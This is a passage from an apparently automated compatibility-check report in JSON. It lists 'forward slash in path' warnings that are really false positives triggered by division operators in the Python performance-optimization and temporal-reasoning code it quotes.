        "warning": "Line 629: Forward slash in path - \"\n        \n        avg_discovery_time = 0.0\n        if self.discovery_times:\n            avg_discovery_time = sum(self.discovery_times) / len(self.discovery_times)\n        \n        return {\n            '",
        "timestamp": "2025-09-05T17:30:42.292741"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Line 78: Forward slash in path - \"\n    target_response_time: float = 1.0  # seconds\n    target_throughput: float = 10.0    # tasks/second\n    target_accuracy: float = 0.9       # 90% accuracy\n    target_memory_efficiency: float = 0.8\n    target_cache_hit_rate: float = 0.8\n    max_cpu_usage: float = 0.8         # 80% CPU\n    max_memory_usage: float = 0.8      # 80% memory\n\n\nclass IntelligentCache:\n    \"",
        "timestamp": "2025-09-05T17:30:42.293061"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Line 194: Forward slash in path - \"\n        total = self.hits + self.misses\n        return self.hits / total if total > 0 else 0.0\n    \n    async def optimize(self) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.293121"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Line 209: Forward slash in path - '] = len(patterns)\n        \n        # Preemptive eviction of unlikely-to-be-used items\n        unlikely_keys = await self.pattern_predictor.predict_unlikely_access(\n            list(self.cache.keys())\n        )\n        \n        if len(unlikely_keys) > len(self.cache) * 0.1:  # Only if significant\n            for key in unlikely_keys[:len(self.cache) // 10]:  # Evict up to 10%\n                await self._evict_key(key)\n                optimization_results['",
        "timestamp": "2025-09-05T17:30:42.293138"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Line 261: Forward slash in path - ': 1.0 / (np.std(intervals) + 1e-6)  # Higher = more regular\n                    }\n        \n        return patterns\n    \n    async def predict_eviction_candidates(self, keys: List[str], count: int) -> List[str]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.293169"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Line 285: Forward slash in path - ']\n                \n                # Score (higher = more likely to evict)\n                if expected_interval > 0:\n                    score = time_since_access / expected_interval\n                else:\n                    score = time_since_access / 3600  # Default to hourly if no pattern\n                \n                # Adjust for access frequency (less frequent = more likely to evict)\n                frequency_factor = 1.0 / (pattern['",
        "timestamp": "2025-09-05T17:30:42.293190"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Line 387: Forward slash in path - \"\n        \n        # System metrics\n        cpu_usage = psutil.cpu_percent(interval=0.1)\n        memory_info = psutil.virtual_memory()\n        memory_usage = memory_info.percent / 100.0\n        \n        # Calculate throughput and response time from recent history\n        current_time = datetime.now()\n        recent_metrics = [m for m in self.metrics_history if (current_time - m.timestamp).total_seconds() < 60]\n        \n        if recent_metrics:\n            avg_response_time = np.mean([m.average_response_time for m in recent_metrics])\n            throughput = len(recent_metrics) / 60.0  # Tasks per second\n        else:\n            avg_response_time = 0.0\n            throughput = 0.0\n        \n        return PerformanceMetrics(\n            timestamp=current_time,\n            cpu_usage=cpu_usage / 100.0,\n            memory_usage=memory_usage,\n            cache_hit_rate=0.0,  # Will be updated by cache systems\n            average_response_time=avg_response_time,\n            throughput=throughput,\n            error_rate=0.0,  # Will be tracked separately\n            concurrent_tasks=0  # Will be updated by task manager\n        )\n    \n    async def _check_thresholds(self, metrics: PerformanceMetrics) -> None:\n        \"",
        "timestamp": "2025-09-05T17:30:42.293256"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Line 499: Forward slash in path - ': ThreadPoolExecutor(max_workers=4)\n        }\n        \n        # Process pool for CPU-intensive tasks\n        self.process_pool = ProcessPoolExecutor(max_workers=max(1, psutil.cpu_count() // 2))\n        \n        # Optimization state\n        self.optimization_active = False\n        self.optimization_task: Optional[asyncio.Task] = None\n        \n        logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.293314"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Line 682: Forward slash in path - ': new_size}\n        \n        elif metrics.memory_usage > 0.8:\n            # Decrease cache size\n            old_size = self.cache_system.max_size\n            new_size = max(old_size // 2, 1000)\n            self.cache_system.max_size = new_size\n            result['",
        "timestamp": "2025-09-05T17:30:42.293430"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Line 742: Forward slash in path - '] = collected\n        \n        # Adjust cache sizes\n        if metrics.memory_usage > 0.8:\n            # Reduce cache size\n            old_cache_size = self.cache_system.max_size\n            new_cache_size = max(old_cache_size // 2, 1000)\n            self.cache_system.max_size = new_cache_size\n            \n            # Trigger cache cleanup\n            excess_items = len(self.cache_system.cache) - new_cache_size\n            if excess_items > 0:\n                await self.cache_system._evict_items(excess_items)\n            \n            result['",
        "timestamp": "2025-09-05T17:30:42.293499"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Line 783: Forward slash in path - \"Optimize I/O performance\"",
        "timestamp": "2025-09-05T17:30:42.293546"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Line 785: Forward slash in path - '}\n        \n        # Implement I/O optimizations\n        # Could include disk I/O optimization, network optimization, etc.\n        result['",
        "timestamp": "2025-09-05T17:30:42.293578"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 246: Forward slash in path - \"\n        \n        # Trend analysis (linear regression slope)\n        time_numeric = np.array([(t - timestamps[0]).total_seconds() for t in timestamps])\n        if len(values) > 1:\n            slope, intercept, r_value, p_value, std_err = stats.linregress(time_numeric, values)\n            trend_slope = slope\n        else:\n            trend_slope = 0.0\n        \n        # Stationarity test (Augmented Dickey-Fuller)\n        try:\n            from statsmodels.tsa.stattools import adfuller\n            adf_result = adfuller(values)\n            stationarity_p_value = adf_result[1]\n        except ImportError:\n            # Fallback: simple variance-based stationarity test\n            if len(values) > 10:\n                mid_point = len(values) // 2\n                first_half_var = np.var(values[:mid_point])\n                second_half_var = np.var(values[mid_point:])\n                variance_ratio = max(first_half_var, second_half_var) / max(min(first_half_var, second_half_var), 1e-10)\n                stationarity_p_value = 1.0 / variance_ratio  # Approximate\n            else:\n                stationarity_p_value = 0.5\n        \n        # Autocorrelation at lag 1\n        autocorr_lag1 = 0.0\n        if len(values) > 2:\n            autocorr_lag1 = np.corrcoef(values[:-1], values[1:])[0, 1]\n            if np.isnan(autocorr_lag1):\n                autocorr_lag1 = 0.0\n        \n        # Seasonality strength (simplified)\n        seasonality_strength = await self._estimate_seasonality_strength(values)\n        \n        return {\n            '",
        "timestamp": "2025-09-05T17:30:42.295109"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 290: Forward slash in path - \"\n        \n        if len(values) < 10:\n            return 0.0\n        \n        # Use FFT to detect dominant frequencies\n        try:\n            # Detrend the data\n            detrended = signal.detrend(values)\n            \n            # Apply FFT\n            fft_values = np.fft.fft(detrended)\n            frequencies = np.fft.fftfreq(len(values))\n            \n            # Find dominant frequency (excluding DC component)\n            power_spectrum = np.abs(fft_values[1:len(values)//2])\n            if len(power_spectrum) > 0:\n                max_power = np.max(power_spectrum)\n                total_power = np.sum(power_spectrum)\n                seasonality_strength = max_power / max(total_power, 1e-10)\n            else:\n                seasonality_strength = 0.0\n                \n        except Exception:\n            # Fallback: coefficient of variation\n            seasonality_strength = np.std(values) / max(np.abs(np.mean(values)), 1e-10)\n            seasonality_strength = min(1.0, seasonality_strength)\n        \n        return min(1.0, seasonality_strength)\n    \n    async def _detect_all_patterns(self, \n                                 variable: str, \n                                 data: List[Tuple[datetime, float]]) -> List[TemporalPattern]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.295178"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 379: Forward slash in path - ': r_value**2\n                },\n                supporting_data=data.copy()\n            )\n            \n            patterns.append(pattern)\n        \n        # Polynomial trend detection (quadratic)\n        if len(data) > 5:\n            try:\n                poly_coeffs = np.polyfit(time_numeric, values, 2)\n                poly_values = np.polyval(poly_coeffs, time_numeric)\n                poly_r_squared = 1 - np.sum((values - poly_values)**2) / np.sum((values - np.mean(values))**2)\n                \n                if poly_r_squared > 0.6 and poly_r_squared > r_value**2 + 0.1:  # Significantly better than linear\n                    pattern = TemporalPattern(\n                        pattern_id=f\"",
        "timestamp": "2025-09-05T17:30:42.295268"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 418: Forward slash in path - \"\n        \n        patterns = []\n        \n        if len(data) < 10:\n            return patterns\n        \n        timestamps = [t for t, v in data]\n        values = np.array([v for t, v in data])\n        \n        # Detrend the data\n        detrended_values = signal.detrend(values)\n        \n        # FFT-based cycle detection\n        try:\n            fft_values = np.fft.fft(detrended_values)\n            frequencies = np.fft.fftfreq(len(values))\n            power_spectrum = np.abs(fft_values)**2\n            \n            # Find significant peaks in power spectrum\n            peak_indices, _ = signal.find_peaks(power_spectrum[1:len(values)//2], height=np.max(power_spectrum) * 0.1)\n            peak_indices += 1  # Adjust for skipping DC component\n            \n            for peak_idx in peak_indices[:3]:  # Top 3 peaks\n                if frequencies[peak_idx] > 0:\n                    period_samples = 1.0 / frequencies[peak_idx]\n                    \n                    # Convert to time period\n                    avg_sample_interval = (timestamps[-1] - timestamps[0]) / len(timestamps)\n                    period_duration = avg_sample_interval * period_samples\n                    \n                    # Calculate cycle strength\n                    cycle_strength = power_spectrum[peak_idx] / np.sum(power_spectrum[1:len(values)//2])\n                    \n                    if cycle_strength > 0.05:  # Minimum threshold\n                        pattern = TemporalPattern(\n                            pattern_id=f\"",
        "timestamp": "2025-09-05T17:30:42.295329"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 479: Forward slash in path - ')\n            autocorr = autocorr[len(autocorr)//2:]\n            autocorr = autocorr / autocorr[0]  # Normalize\n            \n            # Find peaks in autocorrelation\n            peaks, _ = signal.find_peaks(autocorr[1:], height=0.3)\n            peaks += 1  # Adjust for skipping lag 0\n            \n            for peak in peaks[:2]:  # Top 2 peaks\n                lag_duration = (timestamps[-1] - timestamps[0]) * peak / len(timestamps)\n                \n                pattern = TemporalPattern(\n                    pattern_id=f\"",
        "timestamp": "2025-09-05T17:30:42.295399"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 557: Forward slash in path - '])\n                    \n                    if total_variation > 0:\n                        seasonal_strength = seasonal_variation / total_variation\n                        \n                        if seasonal_strength > 0.1:  # Minimum seasonal strength\n                            # Estimate periodicity\n                            if groupby_unit == '",
        "timestamp": "2025-09-05T17:30:42.295479"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 590: Forward slash in path - ': seasonal_variation / total_variation\n                                },\n                                supporting_data=data.copy(),\n                                temporal_scale=TemporalScale.DAY if groupby_unit in ['",
        "timestamp": "2025-09-05T17:30:42.295531"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 604: Forward slash in path - \"\n        \n        patterns = []\n        \n        if len(data) < 10:\n            return patterns\n        \n        timestamps = [t for t, v in data]\n        values = np.array([v for t, v in data])\n        \n        # Statistical anomaly detection (Z-score based)\n        z_scores = np.abs(stats.zscore(values))\n        anomaly_threshold = 3.0  # Standard 3-sigma rule\n        \n        anomalous_indices = np.where(z_scores > anomaly_threshold)[0]\n        \n        if len(anomalous_indices) > 0:\n            # Group consecutive anomalies\n            anomaly_groups = []\n            current_group = [anomalous_indices[0]]\n            \n            for i in range(1, len(anomalous_indices)):\n                if anomalous_indices[i] - anomalous_indices[i-1] <= 2:  # Allow small gaps\n                    current_group.append(anomalous_indices[i])\n                else:\n                    anomaly_groups.append(current_group)\n                    current_group = [anomalous_indices[i]]\n            \n            anomaly_groups.append(current_group)\n            \n            # Create patterns for each anomaly group\n            for group_idx, group in enumerate(anomaly_groups):\n                if len(group) >= 1:  # Minimum anomaly length\n                    start_idx = max(0, group[0] - 1)\n                    end_idx = min(len(data) - 1, group[-1] + 1)\n                    \n                    anomaly_strength = np.mean(z_scores[group]) / anomaly_threshold\n                    \n                    pattern = TemporalPattern(\n                        pattern_id=f\"",
        "timestamp": "2025-09-05T17:30:42.295578"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 655: Forward slash in path - '\n                        },\n                        supporting_data=data[start_idx:end_idx+1]\n                    )\n                    \n                    patterns.append(pattern)\n        \n        # Isolation Forest for multivariate anomaly detection (if applicable)\n        try:\n            from sklearn.ensemble import IsolationForest\n            \n            # Create feature matrix with time-based features\n            time_features = []\n            for t, v in data:\n                features = [\n                    v,  # Value\n                    t.hour,  # Hour of day\n                    t.weekday(),  # Day of week\n                    (t - timestamps[0]).total_seconds() / 3600  # Hours since start\n                ]\n                time_features.append(features)\n            \n            if len(time_features) >= 10:\n                X = np.array(time_features)\n                iso_forest = IsolationForest(contamination=0.1, random_state=42)\n                anomaly_labels = iso_forest.fit_predict(X)\n                \n                # Find anomalies (-1 indicates anomaly)\n                iso_anomalies = np.where(anomaly_labels == -1)[0]\n                \n                if len(iso_anomalies) > 0:\n                    # Group consecutive anomalies\n                    iso_groups = []\n                    current_group = [iso_anomalies[0]]\n                    \n                    for i in range(1, len(iso_anomalies)):\n                        if iso_anomalies[i] - iso_anomalies[i-1] <= 3:\n                            current_group.append(iso_anomalies[i])\n                        else:\n                            iso_groups.append(current_group)\n                            current_group = [iso_anomalies[i]]\n                    \n                    iso_groups.append(current_group)\n                    \n                    # Create patterns for isolation forest anomalies\n                    for group_idx, group in enumerate(iso_groups):\n                        if len(group) >= 2:  # Minimum group size\n                            start_idx = group[0]\n                            end_idx = group[-1]\n                            \n                            pattern = TemporalPattern(\n                                pattern_id=f\"",
        "timestamp": "2025-09-05T17:30:42.295647"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 731: Forward slash in path - \"\n        \n        patterns = []\n        \n        if len(data) < 20:\n            return patterns\n        \n        timestamps = [t for t, v in data]\n        values = np.array([v for t, v in data])\n        \n        # Moving window variance to detect regime changes\n        window_size = max(5, len(data) // 10)\n        variances = []\n        \n        for i in range(window_size, len(values) - window_size):\n            window_var = np.var(values[i-window_size:i+window_size])\n            variances.append(window_var)\n        \n        if len(variances) > 5:\n            # Detect significant changes in variance\n            var_changes = np.abs(np.diff(variances))\n            change_threshold = np.percentile(var_changes, 90)  # Top 10% of changes\n            \n            significant_changes = np.where(var_changes > change_threshold)[0]\n            \n            for change_idx in significant_changes:\n                actual_idx = change_idx + window_size\n                \n                # Analyze the transition\n                before_period = values[max(0, actual_idx - window_size):actual_idx]\n                after_period = values[actual_idx:min(len(values), actual_idx + window_size)]\n                \n                if len(before_period) > 0 and len(after_period) > 0:\n                    # Calculate transition strength\n                    mean_change = abs(np.mean(after_period) - np.mean(before_period))\n                    std_change = abs(np.std(after_period) - np.std(before_period))\n                    \n                    transition_strength = (mean_change + std_change) / (np.std(values) + 1e-10)\n                    \n                    if transition_strength > 0.5:  # Significant transition\n                        pattern = TemporalPattern(\n                            pattern_id=f\"",
        "timestamp": "2025-09-05T17:30:42.295713"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 797: Forward slash in path - \"\n        \n        patterns = []\n        \n        if len(data) < 30:  # Need sufficient data for feedback detection\n            return patterns\n        \n        timestamps = [t for t, v in data]\n        values = np.array([v for t, v in data])\n        \n        # Look for accelerating/decelerating patterns that suggest feedback\n        # Calculate second derivative (acceleration)\n        first_diff = np.diff(values)\n        second_diff = np.diff(first_diff)\n        \n        if len(second_diff) > 0:\n            # Detect sustained acceleration/deceleration\n            window_size = max(5, len(second_diff) // 8)\n            \n            for i in range(window_size, len(second_diff) - window_size):\n                window = second_diff[i-window_size:i+window_size]\n                \n                # Check for consistent acceleration/deceleration\n                if len(window) > 0:\n                    mean_acceleration = np.mean(window)\n                    consistency = np.sum(np.sign(window) == np.sign(mean_acceleration)) / len(window)\n                    \n                    if consistency > 0.7 and abs(mean_acceleration) > np.std(second_diff) * 0.5:\n                        # Detected feedback pattern\n                        feedback_type = \"",
        "timestamp": "2025-09-05T17:30:42.295822"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 829: Forward slash in path - \",\n                            pattern_type=TemporalPatternType.FEEDBACK_LOOP,\n                            variable=variable,\n                            start_time=timestamps[i - window_size],\n                            end_time=timestamps[i + window_size],\n                            strength=min(1.0, abs(mean_acceleration) / np.std(second_diff)),\n                            confidence=consistency,\n                            parameters={\n                                '",
        "timestamp": "2025-09-05T17:30:42.295902"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 883: Forward slash in path - \"\n        \n        change_points = []\n        \n        if len(values) < 10:\n            return change_points\n        \n        # Detect mean shifts using cumulative sum\n        try:\n            # Cumulative sum of deviations from mean\n            mean_val = np.mean(values)\n            cumsum = np.cumsum(values - mean_val)\n            \n            # Find points where cumulative sum changes direction significantly\n            cumsum_diff = np.diff(cumsum)\n            \n            # Detect significant direction changes\n            for i in range(1, len(cumsum_diff) - 1):\n                if (cumsum_diff[i-1] * cumsum_diff[i+1] < 0 and  # Direction change\n                    abs(cumsum_diff[i]) > np.std(cumsum_diff) * 2):  # Significant magnitude\n                    \n                    change_magnitude = abs(cumsum_diff[i]) / np.std(cumsum_diff)\n                    \n                    change_points.append((\n                        timestamps[i + 1],\n                        \"",
        "timestamp": "2025-09-05T17:30:42.296013"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 913: Forward slash in path - \")\n        \n        # Detect variance changes\n        try:\n            window_size = max(5, len(values) // 10)\n            rolling_vars = []\n            \n            for i in range(window_size, len(values) - window_size):\n                window_var = np.var(values[i-window_size:i+window_size])\n                rolling_vars.append((i, window_var))\n            \n            if len(rolling_vars) > 2:\n                var_values = [v for i, v in rolling_vars]\n                var_changes = np.abs(np.diff(var_values))\n                change_threshold = np.percentile(var_changes, 95)  # Top 5% of changes\n                \n                significant_var_changes = np.where(var_changes > change_threshold)[0]\n                \n                for change_idx in significant_var_changes:\n                    actual_idx = rolling_vars[change_idx][0]\n                    change_magnitude = var_changes[change_idx] / np.std(var_changes)\n                    \n                    change_points.append((\n                        timestamps[actual_idx],\n                        \"",
        "timestamp": "2025-09-05T17:30:42.296171"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 942: Forward slash in path - \")\n        \n        # Remove duplicate change points (within 5% of data length)\n        min_distance = max(1, len(timestamps) // 20)\n        filtered_change_points = []\n        \n        for cp in sorted(change_points, key=lambda x: x[0]):\n            if not filtered_change_points or \\\n               any(abs((cp[0] - fcp[0]).total_seconds()) > min_distance * 60 for fcp in filtered_change_points[-3:]):\n                filtered_change_points.append(cp)\n        \n        return filtered_change_points[:10]  # Limit to top 10 change points\n    \n    async def _assess_predictability(self, values: np.ndarray) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.296323"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 956: Forward slash in path - \"\n        \n        if len(values) < 5:\n            return 0.0\n        \n        predictability_factors = []\n        \n        # Autocorrelation-based predictability\n        if len(values) > 2:\n            lag1_autocorr = np.corrcoef(values[:-1], values[1:])[0, 1]\n            if not np.isnan(lag1_autocorr):\n                predictability_factors.append(abs(lag1_autocorr))\n        \n        # Trend strength\n        time_array = np.arange(len(values))\n        if len(values) > 1:\n            slope, intercept, r_value, p_value, std_err = stats.linregress(time_array, values)\n            if not np.isnan(r_value):\n                predictability_factors.append(abs(r_value))\n        \n        # Regularity (inverse of coefficient of variation)\n        if np.std(values) > 0:\n            cv = np.std(values) / abs(np.mean(values) + 1e-10)\n            regularity = 1.0 / (1.0 + cv)\n            predictability_factors.append(regularity)\n        \n        # Signal-to-noise ratio\n        if len(values) > 5:\n            # Simple signal: moving average\n            window_size = min(5, len(values) // 2)\n            signal = np.convolve(values, np.ones(window_size)/window_size, mode='",
        "timestamp": "2025-09-05T17:30:42.296454"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 986: Forward slash in path - ')\n            \n            if len(signal) > 0:\n                # Noise: deviation from moving average\n                aligned_values = values[:len(signal)]\n                noise_std = np.std(aligned_values - signal)\n                signal_std = np.std(signal)\n                \n                if noise_std > 0:\n                    snr = signal_std / noise_std\n                    snr_factor = min(1.0, snr / 5.0)  # Normalize\n                    predictability_factors.append(snr_factor)\n        \n        # Combined predictability score\n        if predictability_factors:\n            return np.mean(predictability_factors)\n        else:\n            return 0.3  # Default moderate predictability\n\n\nclass TemporalPredictor:\n    \"",
        "timestamp": "2025-09-05T17:30:42.296546"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 1104: Forward slash in path - \"\n        \n        # Convert timestamps to numeric values\n        time_numeric = np.array([(t - timestamps[0]).total_seconds() for t in timestamps])\n        target_numeric = (target_time - timestamps[0]).total_seconds()\n        \n        # Fit linear regression\n        slope, intercept, r_value, p_value, std_err = stats.linregress(time_numeric, values)\n        \n        # Predict\n        predicted_value = slope * target_numeric + intercept\n        \n        # Confidence based on R-squared and extrapolation distance\n        max_time = max(time_numeric)\n        extrapolation_factor = min(1.0, target_numeric / max_time) if max_time > 0 else 1.0\n        confidence = abs(r_value) * (1.0 - min(0.5, extrapolation_factor - 1.0))\n        \n        return predicted_value, max(0.1, confidence)\n    \n    async def _exponential_smoothing(self, timestamps: List[datetime], values: np.ndarray,\n                                   target_time: datetime, patterns: List[TemporalPattern]) -> Tuple[float, float]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.296731"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 1125: Forward slash in path - \"\n        \n        # Simple exponential smoothing\n        alpha = 0.3  # Smoothing parameter\n        \n        if len(values) == 0:\n            return 0.0, 0.0\n        \n        # Initialize with first value\n        smoothed = values[0]\n        \n        # Apply exponential smoothing\n        for value in values[1:]:\n            smoothed = alpha * value + (1 - alpha) * smoothed\n        \n        # For future prediction, assume trend continues\n        if len(values) >= 2:\n            recent_trend = values[-1] - values[-2]\n            time_steps = (target_time - timestamps[-1]).total_seconds() / (timestamps[-1] - timestamps[-2]).total_seconds()\n            predicted_value = smoothed + recent_trend * time_steps * 0.5  # Damped trend\n        else:\n            predicted_value = smoothed\n        \n        # Confidence based on recent stability\n        if len(values) >= 3:\n            recent_values = values[-3:]\n            stability = 1.0 - (np.std(recent_values) / (np.mean(np.abs(recent_values)) + 1e-10))\n            confidence = max(0.1, min(0.8, stability))\n        else:\n            confidence = 0.5\n        \n        return predicted_value, confidence\n    \n    async def _pattern_based_prediction(self, timestamps: List[datetime], values: np.ndarray,\n                                      target_time: datetime, patterns: List[TemporalPattern]) -> Tuple[float, float]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.296828"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 1179: Forward slash in path - ', np.mean(values))\n                    \n                    time_elapsed = (target_time - timestamps[0]).total_seconds()\n                    pred_value = slope * time_elapsed + intercept\n                    \n                    predictions.append((pred_value, pattern.confidence * pattern.strength))\n                \n                elif pattern.pattern_type == TemporalPatternType.CYCLE and pattern.periodicity:\n                    # Use cyclical pattern\n                    last_timestamp = timestamps[-1]\n                    time_in_cycle = (target_time - last_timestamp) % pattern.periodicity\n                    cycle_fraction = time_in_cycle / pattern.periodicity\n                    \n                    # Simple sinusoidal approximation\n                    amplitude = pattern.amplitude or np.std(values)\n                    phase = pattern.phase or 0\n                    mean_value = np.mean(values)\n                    \n                    pred_value = mean_value + amplitude * np.sin(2 * np.pi * cycle_fraction + phase)\n                    \n                    predictions.append((pred_value, pattern.confidence * 0.8))\n                \n                elif pattern.pattern_type == TemporalPatternType.SEASONAL and pattern.periodicity:\n                    # Use seasonal pattern\n                    seasonal_means = pattern.parameters.get('",
        "timestamp": "2025-09-05T17:30:42.296944"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 1220: Forward slash in path - \")\n        \n        if predictions:\n            # Weight predictions by confidence\n            total_weight = sum(conf for pred, conf in predictions)\n            if total_weight > 0:\n                weighted_pred = sum(pred * conf for pred, conf in predictions) / total_weight\n                avg_confidence = total_weight / len(predictions)\n                return weighted_pred, avg_confidence\n        \n        # Fallback\n        return float(np.mean(values)), 0.3\n    \n    async def _ensemble_prediction(self, timestamps: List[datetime], values: np.ndarray,\n                                 target_time: datetime, patterns: List[TemporalPattern]) -> Tuple[float, float]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.297034"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 1250: Forward slash in path - \")\n        \n        if not predictions:\n            return float(np.mean(values)), 0.2\n        \n        # Weight by confidence\n        total_weight = sum(conf for pred, conf, method in predictions)\n        \n        if total_weight > 0:\n            ensemble_pred = sum(pred * conf for pred, conf, method in predictions) / total_weight\n            \n            # Ensemble confidence is typically higher due to diversification\n            base_confidence = sum(conf for pred, conf, method in predictions) / len(predictions)\n            ensemble_confidence = min(0.95, base_confidence * 1.2)\n            \n            return ensemble_pred, ensemble_confidence\n        else:\n            return float(np.mean(values)), 0.2\n    \n    async def _calculate_reliability_score(self, method: str, time_horizon: timedelta) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.297106"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
        "warning": "Line 1277: Forward slash in path - ': 0.85\n        }\n        \n        base_reliability = method_reliability.get(method, 0.5)\n        \n        # Adjust for time horizon (closer predictions are more reliable)\n        horizon_hours = time_horizon.total_seconds() / 3600\n        \n        if horizon_hours <= 1:\n            time_factor = 1.0\n        elif horizon_hours <= 6:\n            time_factor = 0.9\n        elif horizon_hours <= 24:\n            time_factor = 0.7\n        elif horizon_hours <= 168:  # 1 week\n            time_factor = 0.5\n        else:\n            time_factor = 0.3\n        \n        return base_reliability * time_factor\n\n\nclass TemporalReasoningEngine:\n    \"",
        "timestamp": "2025-09-05T17:30:42.297173"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\temporal_reasoning.py",
